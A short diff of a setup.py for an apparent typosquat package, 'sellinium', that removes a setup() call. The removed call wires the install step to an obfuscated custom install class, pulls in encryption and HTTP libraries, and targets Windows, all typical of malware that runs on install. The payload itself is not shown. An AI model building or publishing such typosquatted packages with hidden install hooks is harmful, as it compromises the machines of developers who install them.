@@ -18,22 +18,5 @@ class NpNOoCfSBDcDCXQvZdkpHDkvlrmYpgYlBqSDGGOzbZsurLTXbibdGHvqakDdCMLxpPtrGimXFD
             install.run(self)
 
 
-setup(
-    name="sellinium",
-    version=VERSION,
-    author="EwAYRctMucAHLQmQmMvO",
-    author_email="QeBLmZ@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': NpNOoCfSBDcDCXQvZdkpHDkvlrmYpgYlBqSDGGOzbZsurLTXbibdGHvqakDdCMLxpPtrGimXFDgSRmvxEztWnvjHIUpqTA,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 
